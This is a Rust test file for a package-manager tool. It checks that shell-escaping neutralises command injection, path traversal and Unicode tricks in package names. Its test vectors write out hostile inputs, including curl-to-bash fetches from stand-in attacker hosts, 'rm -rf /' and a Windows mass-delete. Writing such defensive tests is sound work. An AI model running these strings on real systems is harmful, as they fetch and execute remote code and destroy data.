//! Security tests for command injection prevention and input validation
//!
//! This module contains comprehensive tests for security-related functionality,
//! focusing on realistic threats and proper shell-escape behavior.

use santa::data::KnownSources;
use santa::sources::*;

fn create_test_source() -> PackageSource {
    PackageSource::new_for_test(
        KnownSources::Brew,
        "🍺",
        "brew",
        "brew install",
        "brew list",
        None,
        None,
    )
}

/// Test suite for command injection prevention with realistic expectations
mod command_injection {
    use super::*;

    #[test]
    fn test_package_name_with_shell_metacharacters() {
        let source = create_test_source();

        let dangerous_packages = vec![
            "git; rm -rf /",
            "git && curl evil.com | bash",
            "$(malicious_command)",
            "`dangerous`",
            "package|evil_command",
            "package>evil_output",
            "package<evil_input",
            "package&background_evil",
        ];

        for dangerous_pkg in dangerous_packages {
            let install_cmd = source.install_packages_command(vec![dangerous_pkg.to_string()]);

            // The command should be properly escaped - dangerous package names should be quoted
            // to prevent shell interpretation of metacharacters
            let is_properly_escaped = install_cmd.contains(&format!("'{}'", dangerous_pkg))
                || install_cmd.contains(&format!("\"{}\"", dangerous_pkg));

            assert!(
                is_properly_escaped,
                "Package name not properly escaped: {} -> {}",
                dangerous_pkg, install_cmd
            );

            // Verify the command still contains the base command
            assert!(
                install_cmd.contains("brew install"),
                "Install command should contain base command: {}",
                install_cmd
            );
        }
    }

    #[test]
    fn test_command_injection_via_prepend() {
        let dangerous_prepends = vec![
            "prefix; rm -rf /; echo ",
            "prefix && evil_command || echo ",
            "prefix`malicious`",
            "prefix$(evil)",
        ];

        for dangerous_prepend in dangerous_prepends {
            let source_with_prepend = PackageSource::new_for_test(
                KnownSources::Brew,
                "🍺",
                "brew",
                "brew install",
                "brew list",
                Some(dangerous_prepend.to_string()),
                None,
            );

            let adjusted = source_with_prepend.adjust_package_name("git");
            let install_cmd = source_with_prepend.install_packages_command(vec!["git".to_string()]);

            // The dangerous prepend should be escaped by shell-escape
            // This means the entire combined string should be quoted
            assert!(
                adjusted.contains('\''),
                "Dangerous prepend not escaped: {} -> {}",
                dangerous_prepend,
                adjusted
            );

            // The install command should still have the base command
            assert!(
                install_cmd.contains("brew install"),
                "Install command should contain base: {}",
                install_cmd
            );
        }
    }

    #[test]
    fn test_benign_package_names_preserved() {
        let source = create_test_source();

        let benign_packages = vec![
            "git",
            "node.js",
            "python3",
            "docker-compose",
            "rust-analyzer",
            "some_package",
            "package-name",
            "package.name",
            "@scope/package", // npm scoped packages
        ];

        for benign_pkg in benign_packages {
            let adjusted = source.adjust_package_name(benign_pkg);

            // Benign package names should either be preserved or lightly escaped
            // They should still be recognizable
            assert!(
                adjusted == benign_pkg || adjusted == format!("'{}'", benign_pkg),
                "Benign package name overly modified: {} -> {}",
                benign_pkg,
                adjusted
            );
        }
    }

    #[test]
    fn test_path_traversal_in_package_names() {
        let source = create_test_source();

        let path_traversal_packages = vec![
            "../../../etc/passwd",
            "../../bin/sh",
            "../../../usr/bin/curl",
            "..\\..\\windows\\system32\\cmd.exe",
        ];

        for traversal_pkg in path_traversal_packages {
            let install_cmd = source.install_packages_command(vec![traversal_pkg.to_string()]);

            // Command structure should be preserved
            assert!(
                install_cmd.contains("brew install"),
                "Command structure should be preserved: {}",
                install_cmd
            );

            // Path traversal sequences get escaped by our sanitizer
            // They should be safely handled (escaped dots) and quoted by shell-escape
            assert!(
                install_cmd.contains("'") || !traversal_pkg.contains("../"),
                "Path traversal should be safely handled: {} -> {}",
                traversal_pkg,
                install_cmd
            );
        }
    }
}

/// Test suite for input validation and edge cases
mod input_validation {
    use super::*;

    #[test]
    fn test_null_byte_handling() {
        let source = create_test_source();

        let null_byte_packages = vec!["git\0rm -rf /", "git\x00evil", "package\0\0evil"];

        for null_pkg in null_byte_packages {
            let adjusted = source.adjust_package_name(null_pkg);

            // Our sanitization removes null bytes completely
            assert!(
                !adjusted.contains('\0'),
                "Null byte should be removed: original={:?}, adjusted={}",
                null_pkg.as_bytes(),
                adjusted
            );
        }
    }

    #[test]
    fn test_unicode_normalization_attacks() {
        let source = create_test_source();

        // Unicode characters that could be used for attacks
        let unicode_packages = vec![
            "git\u{200B}",     // Zero-width space
            "git\u{FEFF}",     // Byte order mark
            "git\u{202E}evil", // Right-to-left override
            "café",            // Normal Unicode is fine
            "package名前",     // Non-Latin scripts are fine
        ];

        for unicode_pkg in unicode_packages {
            let adjusted = source.adjust_package_name(unicode_pkg);

            // Dangerous Unicode characters should be handled by our sanitizer
            if unicode_pkg.contains('\u{200B}')
                || unicode_pkg.contains('\u{FEFF}')
                || unicode_pkg.contains('\u{202E}')
            {
                assert!(
                    !adjusted.contains('\u{200B}')
                        && !adjusted.contains('\u{FEFF}')
                        && !adjusted.contains('\u{202E}'),
                    "Dangerous Unicode should be sanitized: {} -> {}",
                    unicode_pkg,
                    adjusted
                );
            } else {
                // Normal Unicode should be preserved or properly escaped
                let install_cmd = source.install_packages_command(vec![unicode_pkg.to_string()]);
                assert!(
                    install_cmd.contains("brew install"),
                    "Normal Unicode should not break commands: {}",
                    install_cmd
                );
            }
        }
    }

    #[test]
    fn test_empty_package_names() {
        let source = create_test_source();
        let empty_packages = vec!["", " ", "\t", "\n"];

        for empty_pkg in empty_packages {
            let install_cmd = source.install_packages_command(vec![empty_pkg.to_string()]);

            // Empty/whitespace package names should be handled gracefully
            assert!(
                install_cmd.contains("brew install"),
                "Base command should be preserved even with empty package names: {}",
                install_cmd
            );
        }
    }

    #[test]
    fn test_extremely_long_package_names() {
        let source = create_test_source();

        // Test with very long package name (potential DoS or buffer issues)
        let long_package = "a".repeat(10000);
        let adjusted = source.adjust_package_name(&long_package);
        let install_cmd = source.install_packages_command(vec![long_package]);

        // Should not crash and should handle long names appropriately
        assert!(
            adjusted.len() <= 10000 + 100, // Allow for some escaping overhead
            "Package name handling should not cause excessive memory usage"
        );

        // Command should still be valid
        assert!(
            install_cmd.contains("brew install"),
            "Long package name should not break command structure"
        );
    }
}

/// Test suite for platform-specific security concerns
mod platform_security {
    use super::*;

    #[test]
    fn test_windows_specific_injection() {
        let source = PackageSource::new_for_test(
            KnownSources::Scoop,
            "🍨",
            "scoop",
            "scoop install",
            "scoop list",
            None,
            None,
        );

        let windows_dangerous = vec![
            "git & del /f /s /q C:\\*",
            "git ^ powershell -command evil",
            "git | powershell evil.ps1",
        ];

        for dangerous_pkg in windows_dangerous {
            let adjusted = source.adjust_package_name(dangerous_pkg);

            // Windows-specific metacharacters should be escaped with quotes
            assert!(
                adjusted.starts_with('\'') && adjusted.ends_with('\''),
                "Windows-specific command injection not prevented: {} -> {}",
                dangerous_pkg,
                adjusted
            );
        }
    }

    #[test]
    fn test_unix_specific_injection() {
        let source = create_test_source();

        let unix_dangerous = vec![
            "git; chmod +x /tmp/evil.sh && /tmp/evil.sh",
            "git\nrm -rf /",
            "git || curl evil.com/script | bash",
        ];

        for dangerous_pkg in unix_dangerous {
            let adjusted = source.adjust_package_name(dangerous_pkg);

            // Unix-specific metacharacters should be escaped with quotes
            assert!(
                adjusted.starts_with('\'') && adjusted.ends_with('\''),
                "Unix-specific command injection not prevented: {} -> {}",
                dangerous_pkg,
                adjusted
            );
        }
    }
}

/// Integration tests for complete security scenarios
mod integration_security {
    use super::*;

    #[test]
    fn test_end_to_end_package_installation_command_safety() {
        let source = PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            Some("prefix.".to_string()),
            None,
        );

        let mixed_packages = vec![
            "legitimate-package".to_string(),
            "git; rm -rf /".to_string(),
            "normal_package".to_string(),
            "$(evil_command)".to_string(),
        ];

        let install_command = source.install_packages_command(mixed_packages);

        // The final command should:
        // 1. Still contain the base install command
        assert!(install_command.contains("brew install"));

        // 2. Have dangerous packages properly quoted to prevent execution
        assert!(install_command.contains("'git; rm -rf /'"));
        assert!(install_command.contains("'$(evil_command)'"));

        // 3. Still reference the legitimate packages (may or may not be quoted)
        assert!(
            install_command.contains("legitimate-package")
                || install_command.contains("'legitimate-package'")
        );
        assert!(
            install_command.contains("normal_package")
                || install_command.contains("'normal_package'")
        );

        println!("Final secure install command: {}", install_command);
    }

    #[test]
    fn test_realistic_attack_scenario() {
        let source = PackageSource::new_for_test(
            KnownSources::Cargo,
            "🦀",
            "cargo",
            "cargo install",
            "cargo install --list",
            None,
            None,
        );

        // Simulate a realistic attack where malicious package names attempt code injection
        let attack_packages = vec![
            "legit-package".to_string(),
            "; curl -s attacker.com/payload.sh | bash; echo fake-package".to_string(),
            "another-legit-package".to_string(),
        ];

        let install_cmd = source.install_packages_command(attack_packages);

        // Verify the attack is neutralized by proper escaping
        assert!(install_cmd.contains("cargo install"));
        assert!(
            install_cmd.contains("'; curl -s attacker.com/payload.sh | bash; echo fake-package'")
        );

        // The command should be safe to log/display (though not execute with malicious input)
        println!("Secure command with attack neutralized: {}", install_cmd);
    }

    #[test]
    fn test_command_structure_integrity() {
        let source = create_test_source();

        // Test that malicious packages don't break the command structure
        let malicious_packages = vec![
            "'; exit; echo '".to_string(),
            "\"; exit; echo \"".to_string(),
            "package\necho injected\n".to_string(),
        ];

        for pkg in malicious_packages {
            let install_cmd = source.install_packages_command(vec![pkg.clone()]);

            // Command should start with the expected base
            assert!(
                install_cmd.starts_with("brew install"),
                "Command should start correctly: {}",
                install_cmd
            );

            // Dangerous content should be safely escaped - shell-escape handles quotes properly
            // by escaping them within the quoted string
            assert!(
                install_cmd.contains("'") || install_cmd.contains("\""),
                "Malicious package should be quoted/escaped: {} -> {}",
                pkg,
                install_cmd
            );
        }
    }
}
